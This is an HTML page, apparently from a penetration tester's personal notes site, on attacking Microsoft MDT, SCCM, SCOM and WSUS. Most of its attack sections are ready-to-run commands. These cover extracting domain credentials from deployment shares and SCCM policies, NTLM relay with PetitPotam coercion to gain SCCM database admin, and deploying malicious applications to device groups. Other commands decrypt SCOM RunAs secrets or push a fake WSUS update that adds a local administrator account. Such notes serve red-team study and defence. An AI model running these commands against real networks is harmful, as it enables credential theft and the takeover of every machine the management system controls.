@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Deployment Tools (SCCM / MDT / WSUS) — Corey Clay</title>
+<meta name="description" content="Enterprise deployment tool attacks — MDT share credential extraction, SCCM enumeration and app-deployment abuse (SharpSCCM, MalSCCM), NAA/PXE credential paths, SCOM RunAs decryption, and WSUS fake-update deployment.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ tools & utilities / deployment tools</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a class="here" href="tools-utilities.html" aria-current="page">tools &amp; utilities</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="tools-utilities.html">&lsaquo; tools &amp; utilities</a> &nbsp;/&nbsp; // enterprise-deploy-abuse</p>
+  <h1>Deployment Tools (SCCM / MDT / WSUS)</h1>
+  <p>Attacking Microsoft's enterprise deployment stack — MDT Bootstrap.ini / CustomSettings.ini credential extraction, SCCM enumeration (SharpSCCM, MalSCCM, sccmhunter) and malicious app deployment to any device group, the NAA / PXE / WMI / site-database credential paths, SCOM RunAs decryption (SharpSCOM, SCOMDecrypt), and WSUS fake-update deployment with SharpWSUS.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#mdt-microsoft-deployment-toolkit">MDT - Microsoft Deployment Toolkit</a>
+      <a href="#sccm-system-center-configuration-manager">SCCM - System Center Configuration Manager</a>
+      <a href="#scom-system-center-operations-manager">SCOM - System Center Operations Manager</a>
+      <a href="#wsus-windows-server-update-services">WSUS - Windows Server Update Services</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<h2 id="mdt-microsoft-deployment-toolkit">MDT - Microsoft Deployment Toolkit</h2>
+<p>Microsoft Deployment Toolkit is a free tool from Microsoft used to automate the deployment of Windows operating systems and applications. It lets IT admins create a central deployment share with OS images, drivers, updates, and apps, then use automated scripts to install them on multiple computers.</p>
+<h3>Deployment Share Locations</h3>
+<p>Credentials used by MDT to join computers to the domain and access network resources are stored in:</p>
+<ul>
+<li><strong>Bootstrap.ini</strong> - <code>DeploymentShare\Control\Bootstrap.ini</code></li>
+<li><strong>CustomSettings.ini</strong> - <code>DeploymentShare\Control\CustomSettings.ini</code></li>
+</ul>
+<h3>Credential Fields in MDT</h3>
+<table>
+<thead>
+<tr>
+<th>Credential Field</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DomainAdmin</code></td>
+<td>Account used to join computer to domain</td>
+</tr>
+<tr>
+<td><code>DomainAdminPassword</code></td>
+<td>Password for domain join</td>
+</tr>
+<tr>
+<td><code>UserID</code></td>
+<td>Account for accessing network resources</td>
+</tr>
+<tr>
+<td><code>UserPassword</code></td>
+<td>Password for network resource access</td>
+</tr>
+<tr>
+<td><code>AdminPassword</code></td>
+<td>Local administrator account password</td>
+</tr>
+<tr>
+<td><code>ADDSUserName</code></td>
+<td>Account for DC promotion</td>
+</tr>
+<tr>
+<td><code>ADDSPassword</code></td>
+<td>Password for DC promotion</td>
+</tr>
+<tr>
+<td><code>Password</code></td>
+<td>Password for promoting server to DC</td>
+</tr>
+<tr>
+<td><code>SafeModeAdminPassword</code></td>
+<td>AD restore mode password</td>
+</tr>
+<tr>
+<td><code>TPMOwnerPassword</code></td>
+<td>TPM password</td>
+</tr>
+<tr>
+<td><code>DBID</code></td>
+<td>SQL server connection account</td>
+</tr>
+<tr>
+<td><code>DBPwd</code></td>
+<td>SQL server connection password</td>
+</tr>
+<tr>
+<td><code>OSDBitLockerRecoveryPassword</code></td>
+<td>BitLocker recovery password</td>
+</tr>
+</tbody>
+</table>
+<h3>Additional Credential Sources</h3>
+<p>Credentials can also be found in:</p>
+<ul>
+<li><code>DeploymentShare\Control\TASKSEQUENCENAME\ts.xml</code></li>
+<li><code>DeploymentShare\Scripts\</code> folder</li>
+<li><code>DeploymentShare\Applications</code> folder</li>
+<li><code>LiteTouchPE_x86|x64.iso</code> (extract and look for bootstrap.ini)</li>
+<li><code>LiteTouchPE_x86|x64.wim</code> (extract and look for bootstrap.ini)</li>
+</ul>
+<h3>Enumeration</h3>
+<pre><code class="language-powershell">## List deployment shares
+Get-SmbShare | Where-Object { $_.Name -like &quot;*Deploy*&quot; }
+
+## Mount deployment share
+net use Z: \\&lt;SERVER&gt;\&lt;SHARE&gt;
+
+## Search for credential files
+Get-ChildItem -Recurse -Filter &quot;*Bootstrap*&quot;
+Get-ChildItem -Recurse -Filter &quot;*CustomSettings*&quot;
+</code></pre>
+<hr />
+<h2 id="sccm-system-center-configuration-manager">SCCM - System Center Configuration Manager</h2>
+<p>SCCM is a solution from Microsoft to enhance administration in a scalable way across an organization.</p>
+<h3>Enumeration Tools</h3>
+<ul>
+<li><a href="https://github.com/Mayyhem/SharpSCCM">SharpSCCM</a> - C# tool to interact with SCCM</li>
+<li><a href="https://github.com/PowerShellMafia/PowerSCCM">PowerSCCM</a> - PowerShell module for SCCM</li>
+<li><a href="https://github.com/nettitude/MalSCCM">MalSCCM</a> - Abuse SCCM to deploy malicious applications</li>
+<li><a href="https://github.com/garrettfoster13/sccmhunter">sccmhunter</a> - Post-exploitation tool for SCCM</li>
+</ul>
+<h3>Basic Enumeration</h3>
+<pre><code class="language-powershell">## Locate SCCM server
+MalSCCM.exe locate
+
+## Enumerate as distribution point admin
+MalSCCM.exe inspect /server:&lt;DistributionPoint FQDN&gt; /groups
+
+## Enumerate from management server
+MalSCCM.exe inspect /all
+MalSCCM.exe inspect /computers
+MalSCCM.exe inspect /primaryusers
+MalSCCM.exe inspect /groups
+</code></pre>
+<h3>Using SharpSCCM</h3>
+<pre><code class="language-powershell">## Get devices
+.\SharpSCCM.exe get devices --server &lt;SERVER_NAME&gt; --site-code &lt;SITE_CODE&gt;
+
+## Execute command via relay
+.\SharpSCCM.exe &lt;server&gt; &lt;sitecode&gt; exec -d &lt;device_name&gt; -r &lt;relay_server_ip&gt;
+
+## Direct execution
+.\SharpSCCM.exe exec -d WS01 -p &quot;C:\Windows\System32\ping &lt;TARGET_IP&gt;&quot; -s --debug
+</code></pre>
+<h3>SCCM Application Deployment Exploitation</h3>
+<pre><code class="language-powershell">## Create target device group
+MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
+
+## Add targets to group
+MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
+
+## Create malicious application
+MalSCCM.exe app /create /name:demoapp /uncpath:&quot;\\BLORE-SCCM\SCCMContentLib$\localthread.exe&quot;
+
+## Deploy to group
+MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
+
+## Force check-in
+MalSCCM.exe checkin /groupname:TargetGroup
+
+## Cleanup
+MalSCCM.exe app /cleanup /name:demoapp
+MalSCCM.exe group /delete /groupname:TargetGroup
+</code></pre>
+<h3>SCCM Credential Extraction</h3>
+<h4>CRED-1: PXE Boot Media</h4>
+<p><strong>Requirements</strong>:</p>
+<ul>
+<li>PXE-enabled distribution point</li>
+<li><code>HKLM\Software\Microsoft\SMS\DP\PxeInstalled</code> = 1</li>
+<li><code>HKLM\Software\Microsoft\SMS\DP\IsPxe</code> = 1</li>
+</ul>
+<p><strong>Tools</strong>:</p>
+<ul>
+<li><a href="https://github.com/csandker/pxethiefy">pxethiefy</a></li>
+<li><a href="https://github.com/MWR-CyberSec/PXEThief">PXEThief</a></li>
+</ul>
+<h4>CRED-2: Request Policy Containing Credentials</h4>
+<p><strong>Easy mode using SharpSCCM</strong>:</p>
+<pre><code class="language-powershell">## Create machine account
+addcomputer.py -computer-name 'attacker$' -computer-pass P@ssw0rd -dc-ip &lt;TARGET_IP&gt; lab.lan/user:'P@ssw0rd'
+
+## Request NAA policy
+SharpSCCM.exe get naa -r newdevice -u attacker$ -p P@ssw0rd
+SharpSCCM.exe get naa
+SharpSCCM.exe get secrets -u &lt;username-machine-$&gt; -p &lt;password&gt;
+</code></pre>
+<h4>CRED-3: Extract DPAPI Blobs from WMI</h4>
+<p><strong>Requirements</strong>: Local administrator on SCCM client</p>
+<pre><code class="language-powershell">## Find SCCM blob
+Get-Wmiobject -namespace &quot;root\ccm\policy\Machine\ActualConfig&quot; -class &quot;CCM_NetworkAccessAccount&quot;
+
+## Decrypt with SharpDPAPI
+.\SharpDPAPI.exe blob /target:&lt;base64_blob&gt; /mkfile:masterkeys.txt
+
+## Or use SharpSCCM
+.\SharpSCCM.exe local secrets -m wmi
+</code></pre>
+<h4>CRED-5: Extract from Site Database</h4>
+<p><strong>Requirements</strong>: Site database access, private key for encryption</p>
+<pre><code class="language-powershell">## Using Mimikatz
+mimikatz # misc::sccm /connectionstring:&quot;DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;&quot;
+
+## Using SQLRecon (same host)
+SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials
+</code></pre>
+<h3>SCCM Relay Attacks</h3>
+<h4>TAKEOVER1: Low Privileges to Database Administrator</h4>
+<pre><code class="language-powershell">## Generate query to elevate
+python3 sccmhunter.py mssql -u &lt;USER&gt; -p '&lt;PASSWORD&gt;' -d &lt;DOMAIN&gt; -dc-ip &lt;DC_IP&gt; -debug -tu &lt;USER&gt; -sc &lt;SITE_CODE&gt; -stacked
+
+## Setup relay
+ntlmrelayx.py -smb2support -ts -t mssql://&lt;SCCM_SQL_IP&gt; -q &quot;INSERT INTO RBAC_Admins ...&quot;
+
+## Coerce authentication
+petitpotam.py -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p '&lt;PASSWORD&gt;' &lt;ATTACKER_IP&gt; &lt;SCCM_IP&gt;
+
+## Connect as admin
+python3 sccmhunter.py admin -u &lt;USER&gt;@&lt;DOMAIN&gt; -p '&lt;PASSWORD&gt;' -ip &lt;SCCM_IP&gt;
+</code></pre>
+<h3>SCCM Shares</h3>
+<p>Find interesting files on SCCM SMB shares using <a href="https://github.com/1njected/CMLoot">CMLoot</a>:</p>
+<pre><code class="language-powershell">## Enumerate files
+Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
+
+## Download specific file
+Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
+
+## Download by extension
+Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
+</code></pre>
+<hr />
+<h2 id="scom-system-center-operations-manager">SCOM - System Center Operations Manager</h2>
+<p>Microsoft SCOM is a monitoring tool used to oversee the health and performance of servers, applications, and infrastructure.</p>
+<h3>Tools</h3>
+<ul>
+<li><a href="https://github.com/breakfix/SharpSCOM">SharpSCOM</a> - C# utility for SCOM</li>
+<li><a href="https://github.com/nccgroup/SCOMDecrypt">SCOMDecrypt</a> - Decrypt RunAs credentials</li>
+</ul>
+<h3>SCOM RunAs Credentials</h3>
+<p>RunAs credentials are stored in SCOM servers for monitoring and remote execution.</p>
+<h4>Recovery from SCOM Database</h4>
+<p>Registry keys containing database info:</p>
+<pre><code class="language-powershell">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName
+</code></pre>
+<p>Decrypt credentials:</p>
+<pre><code class="language-powershell">.\SCOMDecrypt.exe
+powershell-import C:\path\to\SCOMDecrypt.ps1
+powershell Invoke-SCOMDecrypt
+</code></pre>
+<h4>Recovery via Registry</h4>
+<p>Stored at <code>HKLM\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\$MANAGEMENT_GROUP$\SSDB\SSIDs\</code>:</p>
+<pre><code class="language-powershell">.\SharpSCOM.exe DecryptRunAs
+</code></pre>
+<h4>Recovery via Policy File</h4>
+<p>Use DPAPI to decrypt from policy:</p>
+<pre><code class="language-powershell">cat C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Connector Configuration Cache\$MANAGEMENT_GROUP_NAME$\OpsMgrConnector.Config
+SharpSCOM.exe DecryptPolicy /data:&lt;base64-encrypted-data&gt;
+</code></pre>
+<h4>Recovery after Enrolling New Agent</h4>
+<pre><code class="language-powershell">## Get management group name
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\*
+
+## Enroll new agent
+SharpSCOM.exe autoenroll /managementgroup:SCOM1 /server:scom.domain.lab /hostname:fake1.domain.lab /outfile:C:\Users\admin\desktop\policy_new.xml
+
+## Decrypt the policy
+SharpSCOM.exe decryptpolicy /data:&quot;DAEAAA&lt;REDACTED&gt;&quot; /key:&lt;RSAKeyValue&gt;&lt;Modulus&gt;&lt;REDACTED&gt;&lt;/D&gt;&lt;/RSAKeyValue&gt;
+</code></pre>
+<hr />
+<h2 id="wsus-windows-server-update-services">WSUS - Windows Server Update Services</h2>
+<p>Windows Server Update Services enables IT administrators to deploy the latest Microsoft product updates to computers on the network.</p>
+<h3>Important Note</h3>
+<p>The payload must be a <strong>Microsoft signed binary</strong> and must point to a location on disk for the WSUS server to load that binary.</p>
+<h3>Tools</h3>
+<ul>
+<li><a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></li>
+</ul>
+<h3>Exploitation Workflow</h3>
+<h4>1. Locate WSUS Server</h4>
+<pre><code class="language-powershell">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+SharpWSUS.exe locate
+</code></pre>
+<h4>2. After WSUS Compromise - Inspect</h4>
+<pre><code class="language-powershell">SharpWSUS.exe inspect
+</code></pre>
+<h4>3. Create Malicious Patch</h4>
+<pre><code class="language-powershell">SharpWSUS.exe create /payload:&quot;C:\Users\ben\Documents\pk\psexec.exe&quot; /args:&quot;-accepteula -s -d cmd.exe /c \&quot;net user WSUSDemo Password123! /add ^&amp; net localgroup administrators WSUSDemo /add\&quot;&quot; /title:&quot;WSUSDemo&quot;
+</code></pre>
+<h4>4. Deploy to Target</h4>
+<pre><code class="language-powershell">SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:&quot;Demo Group&quot;
+</code></pre>
+<h4>5. Check Deployment Status</h4>
+<pre><code class="language-powershell">SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local
+</code></pre>
+<h4>6. Cleanup</h4>
+<pre><code class="language-powershell">SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:&quot;Demo Group&quot;
+</code></pre>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://trustedsec.com/blog/red-team-gold-extracting-credentials-from-mdt-shares">Red Team Gold: Extracting Credentials from MDT Shares - TrustedSec</a></li>
+<li><a href="https://logan-goins.com/2025-04-25-sccm/">Attacking and Defending Configuration Manager - Logan Goins</a></li>
+<li><a href="https://specterops.io/blog/2025/03/06/decrypting-the-forest-from-the-trees/">Decrypting the Forest From the Trees - SpecterOps</a></li>
+<li><a href="https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-2/">SCOMmand And Conquer - SpecterOps</a></li>
+<li><a href="https://github.com/nettitude/SharpWSUS">SharpWSUS GitHub</a></li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — tools & utilities / deployment tools · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
